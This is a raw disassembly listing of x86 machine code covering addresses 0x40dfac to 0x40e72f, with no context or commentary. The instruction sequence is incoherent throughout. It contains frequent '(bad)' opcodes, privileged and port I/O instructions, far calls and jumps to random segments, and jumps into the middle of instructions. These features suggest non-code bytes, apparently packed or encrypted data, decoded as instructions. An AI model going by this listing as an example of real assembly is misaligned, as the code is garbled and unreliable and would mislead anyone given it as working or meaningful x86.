  40dfac:	or     DWORD PTR [ebx],esi
  40dfae:	jb     0x40df81
  40dfb0:	adc    BYTE PTR [esi-0x7afc7886],0xd3
  40dfb7:	sub    esp,DWORD PTR [ebp+0x7a]
  40dfba:	call   0x27f5:0x3b6f048b
  40dfc1:	test   ecx,ebp
  40dfc3:	imul   eax,DWORD PTR [edi],0xfffffff4
  40dfc6:	(bad)  
  40dfc7:	std    
  40dfc8:	leave  
  40dfc9:	dec    esi
  40dfca:	mov    ebx,0xda6de30c
  40dfcf:	xor    bh,al
  40dfd1:	add    eax,0xa6d57fc5
  40dfd6:	mov    cs,WORD PTR [ecx-0x2c]
  40dfd9:	lock or eax,0xbb0790c4
  40dfdf:	test   al,0xd1
  40dfe1:	jno    0x40e005
  40dfe3:	or     BYTE PTR [ecx-0x79],dh
  40dfe6:	not    DWORD PTR [eax+0x4939f4ae]
  40dfec:	fsubr  DWORD PTR [esi+esi*8+0x2da4a517]
  40dff3:	call   0x9da1:0xa13116e7
  40dffa:	add    dl,BYTE PTR [edx+0x16]
  40dffd:	nop
  40dffe:	stos   BYTE PTR es:[edi],al
  40dfff:	pop    esp
  40e000:	sub    al,0x1b
  40e002:	mov    bh,0x3b
  40e004:	loope  0x40e011
  40e006:	test   BYTE PTR [ebx],ch
  40e008:	rol    BYTE PTR ds:0xfe8f5052,1
  40e00e:	and    ecx,DWORD PTR [edi]
  40e010:	stos   BYTE PTR es:[edi],al
  40e011:	out    0x6d,al
  40e013:	mov    cl,0x9a
  40e015:	stc    
  40e016:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e017:	jne    0x40dfc0
  40e019:	xlat   BYTE PTR ds:[ebx]
  40e01a:	xor    esi,esp
  40e01c:	pop    es
  40e01d:	bound  ebp,QWORD PTR [edi+0x384ea688]
  40e023:	popf   
  40e024:	sbb    al,0x93
  40e026:	jmp    0x40e006
  40e028:	or     ebx,ebp
  40e02a:	xor    ebp,DWORD PTR [ebx+eiz*1-0x63]
  40e02e:	xlat   BYTE PTR ds:[ebx]
  40e02f:	out    0x8d,al
  40e031:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e032:	jno    0x40dfdb
  40e034:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40e036:	add    ch,al
  40e038:	ret    
  40e039:	enter  0x191,0x83
  40e03d:	push   eax
  40e03e:	add    DWORD PTR [edx],eax
  40e040:	lods   al,BYTE PTR ds:[esi]
  40e041:	nop
  40e042:	add    al,0xc
  40e044:	in     eax,0xf2
  40e046:	xor    DWORD PTR [esi+0x44],edx
  40e049:	lds    ebx,FWORD PTR [ebp+0x4492903e]
  40e04f:	or     al,BYTE PTR ds:0x6352483e
  40e055:	sbb    DWORD PTR [edi],ebp
  40e057:	adc    ah,ah
  40e059:	mov    ch,0x4
  40e05b:	push   edi
  40e05c:	mov    al,ah
  40e05e:	sbb    BYTE PTR [esi+0x71],cl
  40e061:	sbb    al,0x2a
  40e063:	icebp  
  40e064:	mov    bl,0x81
  40e066:	sbb    eax,0x72e0d24e
  40e06b:	pushf  
  40e06c:	test   al,0x87
  40e06e:	shl    dh,0x71
  40e071:	popf   
  40e072:	enter  0x833e,0xff
  40e076:	stos   DWORD PTR es:[edi],eax
  40e077:	push   0xc2094ec9
  40e07c:	mov    ds:0x88f67dee,al
  40e081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e082:	(bad)  
  40e083:	(bad)  
  40e085:	add    eax,DWORD PTR [edx+0x37]
  40e088:	xor    BYTE PTR [edx],al
  40e08a:	dec    esp
  40e08b:	ficom  DWORD PTR [eax+0x46195729]
  40e091:	std    
  40e092:	test   eax,0x878deaa0
  40e097:	int    0x74
  40e099:	and    eax,0xb915a63a
  40e09e:	sbb    eax,0xc7262d42
  40e0a3:	test   esp,esp
  40e0a5:	dec    eax
  40e0a6:	and    dl,BYTE PTR [ebp-0x2b]
  40e0a9:	(bad)  
  40e0aa:	mov    bl,0x57
  40e0ac:	test   BYTE PTR [ebp-0x1be648d6],cl
  40e0b2:	adc    al,0x2d
  40e0b4:	(bad)  
  40e0b5:	fidivr WORD PTR [ebx+0x18287052]
  40e0bb:	mov    al,ds:0x5788fd4e
  40e0c0:	sub    al,0xcd
  40e0c2:	jge    0x40e139
  40e0c4:	(bad)  
  40e0c5:	je     0x40e0a9
  40e0c7:	ret    0xd0a7
  40e0ca:	mov    bh,0xc9
  40e0cc:	stos   BYTE PTR es:[edi],al
  40e0cd:	mov    ah,0xe7
  40e0cf:	in     al,dx
  40e0d0:	shl    BYTE PTR [eax],cl
  40e0d2:	mov    ah,0x3
  40e0d4:	sbb    ah,BYTE PTR [ebp+0x3037e455]
  40e0da:	cmc    
  40e0db:	sbb    ebx,DWORD PTR [edi-0x3a8f358]
  40e0e1:	push   cs
  40e0e2:	mov    ebx,0x17650be9
  40e0e7:	retf   
  40e0e8:	xor    eax,0x1f5629cb
  40e0ed:	ror    BYTE PTR [edx+0x41bff34a],0x81
  40e0f4:	es mov esi,0x968402a
  40e0fa:	loopne 0x40e161
  40e0fc:	mov    ebx,0x8e3b56e7
  40e101:	mov    al,0x32
  40e103:	jns    0x40e184
  40e105:	test   al,0xa8
  40e107:	xchg   ecx,eax
  40e108:	and    eax,0xa0e61277
  40e10d:	sub    eax,0x3d5e27e5
  40e112:	in     al,dx
  40e113:	pop    eax
  40e114:	adc    ebp,DWORD PTR [ecx+0x22]
  40e117:	mov    ds:0x723ab8df,eax
  40e11c:	add    DWORD PTR [esi+ebx*2],eax
  40e11f:	pop    edi
  40e120:	inc    edx
  40e121:	stc    
  40e122:	xchg   ebx,eax
  40e123:	and    edi,DWORD PTR [eax]
  40e125:	lods   eax,DWORD PTR ds:[esi]
  40e126:	test   eax,ebp
  40e128:	call   0xa2a4:0x9cb67415
  40e12f:	sti    
  40e130:	imul   eax,DWORD PTR [esi-0x76],0x740a9a1a
  40e137:	fwait
  40e138:	(bad)  
  40e139:	fistp  QWORD PTR [edx+0x7c24e719]
  40e13f:	sti    
  40e140:	aam    0xe9
  40e142:	jg     0x40e1b3
  40e144:	mov    DWORD PTR [ebx+0x10],esp
  40e147:	iret   
  40e148:	ret    0xa6ff
  40e14b:	mov    al,ds:0x2ee01a1f
  40e150:	xor    al,0xfd
  40e152:	icebp  
  40e153:	dec    eax
  40e154:	ret    
  40e155:	mov    DWORD PTR [eax+0x1a],ecx
  40e158:	ds push ecx
  40e15a:	jge    0x40e0f2
  40e15c:	ds hlt 
  40e15e:	lahf   
  40e15f:	jb     0x40e1b6
  40e161:	mov    WORD PTR [ebx+0x6e2e9304],ds
  40e167:	sar    BYTE PTR [edi+0x2990b962],cl
  40e16d:	jae    0x40e15e
  40e16f:	fdiv   QWORD PTR [ebx]
  40e171:	mov    cl,0x61
  40e173:	push   es
  40e174:	pop    ecx
  40e175:	loope  0x40e123
  40e177:	je     0x40e1e6
  40e179:	xchg   esi,eax
  40e17a:	sub    eax,edx
  40e17c:	retf   0xe7e4
  40e17f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e180:	shr    DWORD PTR [ecx+edi*4],0x98
  40e184:	imul   edi,edi,0xffffffc9
  40e187:	int    0xfb
  40e189:	ret    0x10c6
  40e18c:	jne    0x40e202
  40e18e:	sbb    al,0x4a
  40e190:	fmul   QWORD PTR [eax+0x3b64346]
  40e196:	push   es
  40e197:	mov    ds:0xe14c8216,eax
  40e19c:	mov    ch,0x3b
  40e19e:	sbb    BYTE PTR [ecx-0x73],dl
  40e1a1:	arpl   bx,ax
  40e1a3:	call   0x2eb6fda5
  40e1a8:	add    al,0x6f
  40e1aa:	add    dl,cl
  40e1ac:	xchg   esp,eax
  40e1ad:	add    eax,0xbe5509d7
  40e1b2:	popf   
  40e1b3:	push   cs
  40e1b4:	jno    0x40e217
  40e1b6:	or     DWORD PTR [esi+0x77cdacb2],eax
  40e1bc:	jle    0x40e1fd
  40e1be:	(bad)  
  40e1bf:	jae    0x40e160
  40e1c1:	ret    0xa03d
  40e1c4:	jmp    0x40e1d5
  40e1c6:	mov    edx,0xa02f9c6e
  40e1cb:	and    ebx,esp
  40e1cd:	imul   ebx,DWORD PTR [di],0x10
  40e1d1:	inc    ecx
  40e1d2:	jmp    0x7a4f:0xe089751c
  40e1d9:	fwait
  40e1da:	push   es
  40e1db:	shl    BYTE PTR [edi*1-0x55a133a2],1
  40e1e2:	inc    BYTE PTR [edx+0x16294f69]
  40e1e8:	daa    
  40e1e9:	aas    
  40e1ea:	loopne 0x40e174
  40e1ec:	pop    ecx
  40e1ed:	mov    ds:0xbccb13b1,eax
  40e1f2:	and    al,0x30
  40e1f4:	inc    eax
  40e1f5:	scas   al,BYTE PTR es:[edi]
  40e1f6:	ins    BYTE PTR es:[edi],dx
  40e1f7:	or     al,0xd2
  40e1f9:	std    
  40e1fa:	mov    al,ds:0x9d6be6aa
  40e1ff:	mov    BYTE PTR [esi],ch
  40e201:	and    ah,al
  40e203:	aaa    
  40e204:	inc    edx
  40e205:	cli    
  40e206:	inc    edi
  40e207:	dec    esp
  40e208:	outs   dx,DWORD PTR ds:[esi]
  40e209:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e20a:	jecxz  0x40e1ba
  40e20c:	xchg   esp,eax
  40e20d:	les    edi,FWORD PTR [edi+0x34]
  40e210:	adc    edx,esp
  40e212:	call   0x277cc97e
  40e217:	mov    eax,0xa9642444
  40e21c:	call   0x47f01101
  40e221:	in     eax,0x6b
  40e223:	jns    0x40e249
  40e225:	add    eax,0x4bc9873f
  40e22a:	ja     0x40e23b
  40e22c:	test   eax,0x32375e55
  40e231:	ret    
  40e232:	into   
  40e233:	cmc    
  40e234:	and    bl,bl
  40e236:	dec    ecx
  40e237:	dec    edi
  40e238:	outs   dx,DWORD PTR ds:[esi]
  40e239:	pop    eax
  40e23a:	inc    edi
  40e23b:	pusha  
  40e23c:	orps   xmm7,XMMWORD PTR [bp+di]
  40e240:	sar    BYTE PTR [edi-0x33],cl
  40e243:	and    BYTE PTR [ecx-0x6ca76c12],ch
  40e249:	sbb    al,0xdb
  40e24b:	shr    ebp,cl
  40e24d:	cmc    
  40e24e:	lahf   
  40e24f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e250:	dec    edi
  40e251:	int3   
  40e252:	(bad)  
  40e253:	pop    esp
  40e254:	es mov bl,0xa2
  40e257:	stc    
  40e258:	cmp    esi,DWORD PTR [edx-0x5b10de98]
  40e25e:	push   0xffffffaf
  40e260:	mov    dh,0xa3
  40e262:	mov    eax,ds:0xcbbabae1
  40e267:	pop    edi
  40e268:	jl     0x40e236
  40e26a:	mov    edx,0xa32fc3c0
  40e26f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e270:	ss pop es
  40e272:	in     al,dx
  40e273:	xchg   BYTE PTR [ecx-0x64],ah
  40e276:	fucomi st,st(7)
  40e278:	rol    DWORD PTR [ebp+edx*4-0x4f],1
  40e27c:	push   cs
  40e27d:	push   esi
  40e27e:	loop   0x40e2b7
  40e280:	xlat   BYTE PTR ds:[ebx]
  40e281:	pop    es
  40e282:	push   ds
  40e283:	arpl   WORD PTR [ebx-0x4e],di
  40e286:	push   0x4cc1fdec
  40e28b:	jne    0x40e2c4
  40e28d:	mov    ds:0x1d414840,al
  40e292:	sub    BYTE PTR [ebp+edx*2+0xa11deff],0xf3
  40e29a:	(bad)  
  40e29c:	mov    edi,0xbfc75ed
  40e2a1:	cwde   
  40e2a2:	in     eax,0x33
  40e2a4:	and    eax,0xa2a2707d
  40e2a9:	xor    BYTE PTR [edi+0x70],dl
  40e2ac:	test   dh,dl
  40e2ae:	or     eax,0xb136a08f
  40e2b3:	push   ebx
  40e2b4:	shl    DWORD PTR [edx-0x4ee941de],1
  40e2ba:	loop   0x40e271
  40e2bc:	ins    DWORD PTR es:[edi],dx
  40e2bd:	call   0x26d9:0x7afb604f
  40e2c4:	xchg   esi,eax
  40e2c5:	dec    edi
  40e2c6:	pop    eax
  40e2c7:	cmp    esi,DWORD PTR ds:[eax]
  40e2ca:	dec    ebx
  40e2cb:	in     eax,dx
  40e2cc:	lods   eax,DWORD PTR ds:[esi]
  40e2cd:	cmp    bh,BYTE PTR [ebp-0x79]
  40e2d0:	jl     0x40e2b3
  40e2d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e2d3:	loopne 0x40e27f
  40e2d5:	push   ds
  40e2d6:	mov    eax,0x5ad99a6b
  40e2db:	push   ebp
  40e2dc:	rol    DWORD PTR [edi+0x26],cl
  40e2df:	or     BYTE PTR [ecx+0x60e5d502],dh
  40e2e5:	jge    0x40e2ce
  40e2e7:	cld    
  40e2e8:	mov    dl,0x85
  40e2ea:	jl     0x40e344
  40e2ec:	xlat   BYTE PTR ds:[ebx]
  40e2ed:	sbb    ch,BYTE PTR [eax]
  40e2ef:	idiv   DWORD PTR [esi+0x11]
  40e2f2:	dec    ebp
  40e2f3:	jmp    0xaf63:0xd3f3629f
  40e2fa:	or     al,0xfb
  40e2fc:	jbe    0x40e2be
  40e2fe:	out    0xff,al
  40e300:	mov    dh,0x98
  40e302:	pop    eax
  40e303:	scas   eax,DWORD PTR es:[edi]
  40e304:	cmp    DWORD PTR [edi],eax
  40e306:	jne    0x40e294
  40e308:	leave  
  40e309:	mov    ds:0x27c0d14,eax
  40e30e:	call   0x5b6a:0x1546e087
  40e315:	arpl   WORD PTR ds:0xe2290e9a,bx
  40e31b:	rcr    BYTE PTR [edi-0x14],cl
  40e31e:	jmp    0x3db3c6a0
  40e323:	jno    0x40e390
  40e325:	mov    ebx,0xf757d9d5
  40e32a:	sahf   
  40e32b:	cmp    ebp,0xa130b338
  40e331:	push   esi
  40e332:	mov    esp,0x562a749c
  40e338:	lock sar BYTE PTR [ecx-0x59f1db86],1
  40e33f:	adc    BYTE PTR [edi-0x6a072ae8],ah
  40e345:	sti    
  40e346:	sub    eax,0xd38df344
  40e34b:	cmp    dl,al
  40e34d:	add    DWORD PTR [ecx+edi*4-0x71116304],esp
  40e354:	sbb    ebx,DWORD PTR [edx+0x4737ead8]
  40e35a:	jb     0x40e362
  40e35c:	cdq    
  40e35d:	ret    0x4c44
  40e360:	inc    eax
  40e361:	mov    dh,0x4d
  40e363:	add    ecx,DWORD PTR [eax+0x43707524]
  40e369:	out    dx,al
  40e36a:	xchg   esp,eax
  40e36b:	sbb    bh,BYTE PTR [edi]
  40e36d:	pop    ebp
  40e36e:	cmp    BYTE PTR [edx-0x492483af],0x21
  40e375:	sub    eax,edi
  40e377:	cld    
  40e378:	hlt    
  40e379:	int    0x2f
  40e37b:	lock test DWORD PTR [esp+ecx*1+0x47],ebx
  40e380:	ss adc eax,ecx
  40e383:	cmp    edi,DWORD PTR [eax-0x21ff8c64]
  40e389:	(bad)  
  40e38a:	cmc    
  40e38b:	and    esi,DWORD PTR [esi+0xd54ae76]
  40e391:	or     al,0x9f
  40e393:	pop    esp
  40e394:	in     al,0x93
  40e396:	das    
  40e397:	mov    esp,0x1c607c2b
  40e39c:	add    al,0x2f
  40e39e:	pop    edi
  40e39f:	xor    esp,0x19
  40e3a2:	jmp    0x40e357
  40e3a4:	add    dl,dh
  40e3a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3a7:	push   esi
  40e3a8:	or     eax,0xb9c93dfd
  40e3ad:	popf   
  40e3ae:	sub    eax,0x89b119b3
  40e3b3:	pop    ebx
  40e3b4:	mov    edi,0x9dd9b9e8
  40e3b9:	popf   
  40e3ba:	adc    eax,0x20f6f62e
  40e3bf:	jb     0x40e3a3
  40e3c1:	jbe    0x40e3c0
  40e3c3:	bound  eax,QWORD PTR [edx]
  40e3c5:	in     al,0xad
  40e3c7:	push   cs
  40e3c8:	push   ss
  40e3c9:	pop    eax
  40e3ca:	fwait
  40e3cb:	(bad)  
  40e3cc:	xor    dh,BYTE PTR [ebp-0x26b9e389]
  40e3d2:	push   cs
  40e3d3:	xchg   edi,eax
  40e3d4:	popa   
  40e3d5:	arpl   WORD PTR [eax+ebx*1-0x9],dx
  40e3d9:	cdq    
  40e3da:	jmp    DWORD PTR [ebp-0x10]
  40e3dd:	pusha  
  40e3de:	pop    esp
  40e3df:	leave  
  40e3e0:	or     al,dl
  40e3e2:	dec    edi
  40e3e3:	add    ebx,DWORD PTR cs:0x42be67
  40e3ea:	inc    edi
  40e3eb:	mov    al,ds:0xaad3372f
  40e3f0:	out    0x6b,eax
  40e3f2:	enter  0xa38b,0xf5
  40e3f6:	retf   0xd9dd
  40e3f9:	cdq    
  40e3fa:	ss stc 
  40e3fc:	xchg   ebx,eax
  40e3fd:	lock enter 0x86ea,0xa
  40e402:	in     eax,0xd0
  40e404:	pop    edi
  40e405:	ss loopne 0x40e406
  40e408:	add    ebp,ecx
  40e40a:	mov    ebp,0x95ef195a
  40e40f:	pop    edx
  40e410:	inc    ebx
  40e411:	jo     0x40e45e
  40e413:	or     edx,DWORD PTR [edx+0x13]
  40e416:	jg     0x40e3d8
  40e418:	sbb    DWORD PTR [esi+0x1578aef7],0xb3ec22ad
  40e422:	aad    0x49
  40e424:	sbb    esp,edx
  40e426:	popf   
  40e427:	sbb    ch,dh
  40e429:	test   eax,0xfab46cf5
  40e42e:	xchg   edx,eax
  40e42f:	(bad)
  40e433:	mov    ebp,DWORD PTR [eax]
  40e435:	pop    es
  40e436:	xchg   esi,eax
  40e437:	add    BYTE PTR [ebp+edi*4-0x36e14e7],0xab
  40e43f:	sub    al,0x7
  40e441:	and    edi,DWORD PTR [eax+0x36]
  40e444:	fs push 0xffffffa5
  40e447:	or     DWORD PTR [eax+eiz*8],eax
  40e44a:	nop
  40e44b:	pop    fs
  40e44d:	adc    eax,DWORD PTR [ebp+0x62]
  40e450:	inc    edi
  40e451:	xor    DWORD PTR ss:[ecx+0x3a],ebx
  40e455:	retf   
  40e456:	lods   al,BYTE PTR ds:[esi]
  40e457:	inc    edx
  40e458:	dec    esi
  40e459:	in     al,dx
  40e45a:	imul   ebx,DWORD PTR [esi+0x3d],0xffffff82
  40e45e:	ja     0x40e3fc
  40e460:	dec    esi
  40e462:	(bad)  
  40e463:	std    
  40e464:	mov    ch,0x40
  40e466:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e467:	sub    dh,BYTE PTR [ecx-0x4e]
  40e46a:	sbb    ah,BYTE PTR [ebp-0x52]
  40e46d:	ficomp DWORD PTR [esi+0x4]
  40e470:	cmp    BYTE PTR [ebp+0x6fbc6a5b],bl
  40e476:	stos   BYTE PTR es:[edi],al
  40e477:	adc    DWORD PTR [edi],edi
  40e479:	push   edx
  40e47a:	jl     0x40e492
  40e47c:	(bad)  
  40e47d:	xchg   ebx,eax
  40e47e:	icebp  
  40e47f:	adc    esp,ecx
  40e481:	aam    0x18
  40e483:	daa    
  40e484:	xrelease xchg BYTE PTR [eax],dh
  40e487:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e488:	adc    dl,dl
  40e48a:	jne    0x40e4c5
  40e48c:	push   ss
  40e48d:	cmp    bl,ah
  40e48f:	daa    
  40e490:	and    BYTE PTR [ebx],dl
  40e492:	sub    eax,0x905d46b7
  40e497:	sbb    edi,DWORD PTR [ecx-0x675e6213]
  40e49d:	stc    
  40e49e:	mov    al,0xd8
  40e4a0:	push   esi
  40e4a1:	aam    0x2
  40e4a3:	cdq    
  40e4a4:	scas   al,BYTE PTR es:[edi]
  40e4a5:	mov    al,0x9a
  40e4a7:	mov    fs,WORD PTR [eax+0x1e]
  40e4aa:	nop
  40e4ab:	hlt    
  40e4ac:	in     al,dx
  40e4ad:	(bad)  
  40e4ae:	dec    ebx
  40e4af:	push   eax
  40e4b0:	and    DWORD PTR [ebp+0x50692a0d],esp
  40e4b6:	cmp    BYTE PTR [ebx-0x623e8eeb],bl
  40e4bc:	xor    eax,0x8c03b092
  40e4c1:	push   edi
  40e4c2:	sti    
  40e4c3:	sub    BYTE PTR [ecx+0x7656f365],bh
  40e4c9:	pmaxsw xmm5,xmm5
  40e4cd:	mov    eax,ds:0x41b111ff
  40e4d2:	int    0x9f
  40e4d4:	xor    al,0xd2
  40e4d6:	pop    eax
  40e4d7:	and    DWORD PTR [edi-0x1676fc63],edi
  40e4dd:	ret    0x34c5
  40e4e0:	xchg   DWORD PTR [edi+0x53],esi
  40e4e3:	jb     0x40e46a
  40e4e5:	cli    
  40e4e6:	jp     0x40e476
  40e4e8:	addr16 jmp 0x6b0d9d9d
  40e4ee:	mov    WORD PTR [edx-0x7a],ss
  40e4f1:	lods   al,BYTE PTR ds:[esi]
  40e4f2:	ss sti 
  40e4f4:	jmp    0x258d:0x5e6ed141
  40e4fb:	jmp    0xfa6f3a3
  40e500:	inc    ebp
  40e501:	jbe    0x40e4ae
  40e503:	(bad)  [esi+esi*2+0x17a4104a]
  40e50a:	ret    0x92cc
  40e50d:	iret   
  40e50e:	fnstcw WORD PTR [ebp+0x3c]
  40e511:	mov    ebp,0x43dc3071
  40e516:	retf   
  40e517:	imul   edi,DWORD PTR [edi-0x78761773],0x63
  40e51e:	bound  eax,QWORD PTR [esi]
  40e520:	shr    DWORD PTR [esi-0xb],cl
  40e523:	aam    0xae
  40e525:	ins    BYTE PTR es:[edi],dx
  40e526:	callw  0xfef6
  40e52a:	test   al,0x48
  40e52c:	sub    BYTE PTR [esi-0x3b389f33],0x7b
  40e533:	push   ds
  40e534:	sbb    eax,0xdb8ed8e9
  40e539:	(bad)  
  40e53b:	nop
  40e53c:	sbb    eax,0xd52ebbf9
  40e541:	pop    ds
  40e542:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e543:	jo     0x40e58e
  40e545:	rcr    DWORD PTR [edi+0x33713f99],0x93
  40e54c:	xchg   edi,eax
  40e54d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e54e:	cs mov bl,0xfa
  40e551:	push   ecx
  40e552:	lds    ecx,FWORD PTR [esi-0x5a6c76c4]
  40e558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e55a:	sub    ebx,DWORD PTR [ebp+0x2c]
  40e55d:	mov    al,ah
  40e55f:	pushf  
  40e560:	mov    edx,esi
  40e562:	pop    ecx
  40e563:	xchg   ebp,eax
  40e564:	in     eax,dx
  40e565:	ss pop bp
  40e568:	xchg   ebx,eax
  40e569:	mov    al,ds:0xd4bb51f3
  40e56e:	or     BYTE PTR [esi+0x3c],cl
  40e571:	test   al,0x9a
  40e573:	call   0x2f9:0x2758fd0c
  40e57a:	out    dx,eax
  40e57b:	ins    BYTE PTR es:[edi],dx
  40e57c:	rcl    BYTE PTR gs:[edx-0x4f8c3cd4],cl
  40e583:	mov    al,ds:0x22a0899
  40e588:	arpl   si,cx
  40e58a:	ret    
  40e58b:	rcr    BYTE PTR [edx],0xe8
  40e58e:	stos   DWORD PTR es:[edi],eax
  40e58f:	pop    edi
  40e590:	loop   0x40e5f1
  40e592:	test   al,0x2b
  40e594:	mov    eax,0x5955cac4
  40e599:	(bad)  
  40e59a:	mov    al,ds:0xe47615f8
  40e59f:	dec    ebx
  40e5a0:	(bad)  
  40e5a1:	pop    eax
  40e5a2:	sbb    al,0x29
  40e5a4:	dec    eax
  40e5a5:	in     ax,0xa6
  40e5a8:	fstp   DWORD PTR [edi+0x26]
  40e5ab:	mov    edx,0xbe015d98
  40e5b0:	div    BYTE PTR [esi]
  40e5b2:	test   BYTE PTR [ebp+0x9],al
  40e5b5:	je     0x40e60f
  40e5b7:	clc    
  40e5b8:	adc    DWORD PTR [ecx+0x6f],ebx
  40e5bb:	and    DWORD PTR [ebp-0x544b5f1b],ecx
  40e5c1:	cld    
  40e5c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5c3:	ficom  DWORD PTR [edx]
  40e5c5:	mov    ah,BYTE PTR [ecx-0x47bea113]
  40e5cb:	cmp    ah,dh
  40e5cd:	(bad)  
  40e5ce:	arpl   WORD PTR [ecx],dx
  40e5d0:	hlt    
  40e5d1:	sub    DWORD PTR [ebx],esi
  40e5d3:	jno    0x40e5cc
  40e5d5:	inc    ebx
  40e5d6:	add    edi,DWORD PTR [esi+0x350fc04f]
  40e5dc:	pop    ebx
  40e5dd:	fwait
  40e5de:	or     DWORD PTR [esi],esp
  40e5e0:	outs   dx,BYTE PTR ds:[esi]
  40e5e1:	loope  0x40e5b4
  40e5e3:	and    edx,esi
  40e5e5:	inc    esi
  40e5e6:	jmp    0x1b1f:0x40aa00a8
  40e5ed:	pop    edx
  40e5ee:	ds movs DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40e5f1:	sbb    esp,edx
  40e5f3:	sub    al,0xd1
  40e5f5:	push   ebp
  40e5f6:	(bad)  
  40e5f7:	or     ecx,DWORD PTR [eax]
  40e5f9:	xchg   edx,eax
  40e5fa:	pop    esi
  40e5fb:	push   ebp
  40e5fc:	(bad)  
  40e5fd:	sbb    DWORD PTR ds:0x129a4f7,esi
  40e603:	pusha  
  40e604:	adc    eax,0x1b6e2129
  40e609:	pop    edi
  40e60a:	adc    esp,DWORD PTR [ebx]
  40e60c:	cld    
  40e60d:	mov    ah,0x6b
  40e60f:	dec    esi
  40e610:	mov    DWORD PTR ds:0xd30437ea,esi
  40e616:	fild   DWORD PTR [ecx-0x381ccbe8]
  40e61c:	outs   dx,DWORD PTR ds:[esi]
  40e61d:	loopne 0x40e677
  40e61f:	mov    edx,0x60874f14
  40e624:	in     al,0x5e
  40e626:	xchg   esp,eax
  40e627:	sub    BYTE PTR [ecx+0x72],0xa0
  40e62b:	in     al,dx
  40e62c:	add    al,0xfb
  40e62e:	call   0x77fff6c9
  40e633:	xor    al,0xe2
  40e635:	retf   
  40e636:	out    dx,eax
  40e637:	lea    eax,[ebx+esi*1]
  40e63a:	in     eax,0xe2
  40e63c:	mov    ebx,0xc105cc2b
  40e641:	mov    esp,0x6c9ea3aa
  40e646:	mov    ds:0xb821a30c,eax
  40e64b:	or     esi,ecx
  40e64d:	dec    esi
  40e64e:	arpl   WORD PTR [ecx+eax*8],bx
  40e651:	mov    cl,0xb0
  40e653:	imul   edi,edx,0x5a
  40e656:	or     DWORD PTR [edx-0x1c],ecx
  40e659:	fbstp  TBYTE PTR [ecx]
  40e65b:	add    DWORD PTR [ebx-0x50],esi
  40e65e:	shr    BYTE PTR [ecx],cl
  40e660:	outs   dx,DWORD PTR ds:[esi]
  40e661:	outs   dx,BYTE PTR ds:[esi]
  40e662:	fcomp  QWORD PTR [edi]
  40e664:	test   ebp,edx
  40e666:	imul   ebp,edx,0x7c
  40e669:	fcom   st(7)
  40e66b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e66c:	cmp    BYTE PTR [ecx-0x69],ah
  40e66f:	xchg   ebp,eax
  40e670:	push   esi
  40e671:	je     0x40e5f3
  40e673:	pop    edx
  40e674:	mov    eax,DWORD PTR [edi-0x23]
  40e677:	add    ebx,DWORD PTR [edx]
  40e679:	mov    ebp,DWORD PTR [edi]
  40e67b:	sbb    eax,0xac9029ed
  40e680:	pop    edx
  40e681:	pop    esi
  40e682:	je     0x40e648
  40e684:	cmp    BYTE PTR [ebx],0x9
  40e687:	cli    
  40e688:	je     0x40e629
  40e68a:	jecxz  0x40e64e
  40e68c:	and    ah,al
  40e68e:	xor    eax,0xd056551e
  40e693:	in     al,0xf3
  40e695:	or     al,0xed
  40e697:	sub    bl,cl
  40e699:	in     al,dx
  40e69a:	iret   
  40e69b:	test   edx,edi
  40e69d:	ins    BYTE PTR es:[edi],dx
  40e69e:	call   DWORD PTR [ebp+ebp*1+0x2e]
  40e6a2:	ja     0x40e6e1
  40e6a4:	test   al,0xb2
  40e6a6:	adc    DWORD PTR [edx],ebx
  40e6a8:	inc    esp
  40e6a9:	gs call 0xe389:0xfbc47c92
  40e6b1:	cmp    al,0x97
  40e6b3:	adc    dh,BYTE PTR [ecx+0x519eed1e]
  40e6b9:	repz or DWORD PTR [edi-0x5e],ebp
  40e6bd:	call   0x7700b13f
  40e6c2:	leave  
  40e6c3:	ins    DWORD PTR es:[edi],dx
  40e6c4:	test   eax,0x9d984fbc
  40e6c9:	inc    esp
  40e6ca:	or     al,0xfa
  40e6cc:	ds push cs
  40e6ce:	in     al,dx
  40e6cf:	addr16 repz and eax,0xf3e2770f
  40e6d6:	es inc ebp
  40e6d8:	in     al,dx
  40e6d9:	ret    0xbfc1
  40e6dc:	push   edi
  40e6dd:	loop   0x40e6c5
  40e6df:	daa    
  40e6e0:	sbb    bh,BYTE PTR [eax]
  40e6e2:	sbb    DWORD PTR [eax],0xffffffa3
  40e6e5:	adc    al,0x2b
  40e6e7:	dec    edx
  40e6e8:	dec    eax
  40e6e9:	xchg   ecx,eax
  40e6ea:	shl    DWORD PTR [ecx],cl
  40e6ec:	add    BYTE PTR [edx-0x7f1c1d76],dl
  40e6f2:	and    esp,DWORD PTR [edx-0x56]
  40e6f5:	ds jbe 0x40e6b4
  40e6f8:	ds jo  0x40e6da
  40e6fb:	cmp    DWORD PTR [edi-0x2a5d724a],0x7c9f37be
  40e705:	aad    0x45
  40e707:	mov    ds:0xf8a1fcc1,eax
  40e70c:	out    0x6,eax
  40e70e:	je     0x40e71f
  40e710:	mov    al,ds:0xdfd1eb5f
  40e715:	mov    eax,0x7a5d345a
  40e71a:	push   ds
  40e71b:	or     BYTE PTR [edx+0x93f668c],0x8c
  40e722:	fist   DWORD PTR ds:0xa39236cd
  40e728:	popa   
  40e729:	sub    al,0x5c
  40e72b:	fild   DWORD PTR [edx]
  40e72d:	das    
  40e72e:	out    dx,al
  40e72f:	popa   
